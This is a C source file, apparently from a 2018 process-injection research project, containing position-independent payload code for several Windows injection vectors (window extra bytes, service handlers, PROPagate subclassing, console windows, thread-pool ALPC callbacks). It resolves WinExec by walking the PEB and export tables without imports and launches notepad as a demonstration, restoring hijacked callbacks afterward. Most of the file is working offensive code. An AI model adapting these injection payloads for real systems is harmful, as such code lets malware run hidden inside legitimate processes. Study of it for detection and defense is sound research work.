/**
  Copyright © 2018 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#include "getapi.h"
  
typedef UINT (WINAPI *WinExec_t)(
  _In_ LPCSTR lpCmdLine, _In_ UINT uCmdShow);

LPVOID xGetProcAddress(LPVOID pszAPI);
int xstrcmp(char*,char*);

#ifdef WINDOW // Extra Window Bytes
LRESULT CALLBACK WndProc(HWND hWnd, UINT uMsg, 
  WPARAM wParam, LPARAM lParam)
#endif
  
#ifdef SVCCTRL // Service Control Handler
DWORD Handler(DWORD dwControl)
#endif

#ifdef SUBCLASS // PROPagate
LRESULT CALLBACK SubclassProc(HWND hWnd, UINT uMsg, WPARAM wParam, 
  LPARAM lParam, UINT_PTR uIdSubclass, DWORD_PTR dwRefData)
#endif

#ifdef CONSOLE // ConsoleWindowClass
HWND GetWindowHandle(VOID)
#endif

#ifdef TPOOL // Thread Pool Callback
// the wrong types are used here, but it doesn't really matter
typedef struct _TP_ALPC {
    // ALPC callback info
    ULONG_PTR   AlpcPool;
    ULONG_PTR   Unknown1;
    ULONG_PTR   Unknown2;
    ULONG_PTR   Unknown3;
    ULONG_PTR   Unknown4;
    ULONG_PTR   AlpcActivationContext;
    ULONG_PTR   AlpcFinalizationCallback;
    ULONG_PTR   AlpcCallback;
    ULONG_PTR   Unknown5;
    // callback environment
    ULONG_PTR   Version;
    ULONG_PTR   Pool;
    ULONG_PTR   CleanupGroup;
    ULONG_PTR   CleanupGroupCancelCallback;
    ULONG_PTR   RaceDll;
    ULONG_PTR   ActivationContext;
    ULONG_PTR   FinalizationCallback;
    ULONG_PTR   Flags;
    ULONG_PTR   CallbackPriority;
    ULONG_PTR   Size;
    ULONG_PTR   Callback;
    ULONG_PTR   CallbackParameter;
} TP_ALPC;

typedef struct _tp_param_t {
    ULONG_PTR   Callback;
    ULONG_PTR   CallbackParameter;
} tp_param;

typedef TP_ALPC TP_ALPC, *PTP_ALPC;

typedef void (WINAPI *LrpcIoComplete_t)(LPVOID, LPVOID, LPVOID, LPVOID);

VOID TpCallBack(LPVOID tp_callback_instance, 
  LPVOID param, PTP_ALPC alpc, LPVOID unknown2) 
#endif
{
    WinExec_t pWinExec;
    DWORD     szWinExec[2],
              szNotepad[3];
    #ifdef TPOOL
      LrpcIoComplete_t pLrpcIoComplete;
      tp_param         *tp=(tp_param*)param;
      ULONG_PTR        op;
      // param should contain pointer to tp_param
      pLrpcIoComplete = (LrpcIoComplete_t)tp->Callback;
      op              = tp->CallbackParameter;
      // restore original values
      // this will indicate we executed ok,
      // but is also required before the call to WinExec
      alpc->Callback          = tp->Callback;
      alpc->CallbackParameter = tp->CallbackParameter;
    #endif
    // now call WinExec to start notepad
    szWinExec[0] = *(DWORD*)"WinE";
    szWinExec[1] = *(DWORD*)"xec\0";
    
    szNotepad[0] = *(DWORD*)"note";
    szNotepad[1] = *(DWORD*)"pad\0";

    pWinExec = (WinExec_t)xGetProcAddress(szWinExec);
    
    if(pWinExec != NULL) {
      pWinExec((LPSTR)szNotepad, SW_SHOW);
    }
    
    // finally, pass the original message on..
    #ifdef TPOOL 
      pLrpcIoComplete(tp_callback_instance, 
        (LPVOID)alpc->CallbackParameter, alpc, unknown2);
    #endif
    
    #ifndef TPOOL
    return 0;
    #endif
}

// locate address of API in export table
LPVOID FindExport(LPVOID base, PCHAR pszAPI){
    PIMAGE_DOS_HEADER       dos;
    PIMAGE_NT_HEADERS       nt;
    DWORD                   cnt, rva, dll_h;
    PIMAGE_DATA_DIRECTORY   dir;
    PIMAGE_EXPORT_DIRECTORY exp;
    PDWORD                  adr;
    PDWORD                  sym;
    PWORD                   ord;
    PCHAR                   api, dll;
    LPVOID                  api_adr=NULL;
    
    dos = (PIMAGE_DOS_HEADER)base;
    nt  = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);
    dir = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory;
    rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    
    // if no export table, return NULL
    if (rva==0) return NULL;
    
    exp = (PIMAGE_EXPORT_DIRECTORY) RVA2VA(ULONG_PTR, base, rva);
    cnt = exp->NumberOfNames;
    
    // if no api names, return NULL
    if (cnt==0) return NULL;
    
    adr = RVA2VA(PDWORD,base, exp->AddressOfFunctions);
    sym = RVA2VA(PDWORD,base, exp->AddressOfNames);
    ord = RVA2VA(PWORD, base, exp->AddressOfNameOrdinals);
    dll = RVA2VA(PCHAR, base, exp->Name);
    
    do {
      // calculate hash of api string
      api = RVA2VA(PCHAR, base, sym[cnt-1]);
      // add to DLL hash and compare
      if (!xstrcmp(pszAPI, api)){
        // return address of function
        api_adr = RVA2VA(LPVOID, base, adr[ord[cnt-1]]);
        return api_adr;
      }
    } while (--cnt && api_adr==0);
    return api_adr;
}

// search all modules in the PEB for API
LPVOID xGetProcAddress(LPVOID pszAPI) {
    PPEB                  peb;
    PPEB_LDR_DATA         ldr;
    PLDR_DATA_TABLE_ENTRY dte;
    LPVOID                api_adr=NULL;
    
  #if defined(_WIN64)
    peb = (PPEB) __readgsqword(0x60);
  #else
    peb = (PPEB) __readfsdword(0x30);
  #endif

    ldr = (PPEB_LDR_DATA)peb->Ldr;
    
    // for each DLL loaded
    for (dte=(PLDR_DATA_TABLE_ENTRY)ldr->InLoadOrderModuleList.Flink;
         dte->DllBase != NULL && api_adr == NULL; 
         dte=(PLDR_DATA_TABLE_ENTRY)dte->InLoadOrderLinks.Flink)
    {
      // search the export table for api
      api_adr=FindExport(dte->DllBase, (PCHAR)pszAPI);  
    }
    return api_adr;
}

// same as strcmp
int xstrcmp(char *s1, char *s2){
    while(*s1 && (*s1==*s2))s1++,s2++;
    return (int)*(unsigned char*)s1 - *(unsigned char*)s2;
}
